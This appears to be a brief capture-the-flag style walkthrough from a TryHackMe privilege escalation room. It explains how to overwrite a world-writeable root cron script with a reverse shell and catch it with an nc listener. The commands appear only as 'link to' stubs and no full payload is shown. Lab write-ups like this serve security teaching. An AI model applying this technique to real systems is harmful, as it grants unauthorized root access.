# cron-overwrite

*Credit to Tib3rius* | https://tryhackme.com/room/linuxprivesc

Given a cron job that runs a script with root privileges and is world-writeable.
Overwrite the script with with a bash script that connects back to the attacking machine with a reverse shell with root permissions.

1. View the contents of the system-wide crontab:

link to cat /etc/crontab

2. Locate the full path of the overwrite.sh file:

link to locate overwrite.sh

3. Check the file permissions of overwrite.sh:

* Note that the file is world-writeable

link to ls -l

4. Replace the contents of the overwrite.sh file with the following (IP of attacking machine):

link to /bin/bash

5. Get reverse shell with root privilegs

link to nc -nlvp
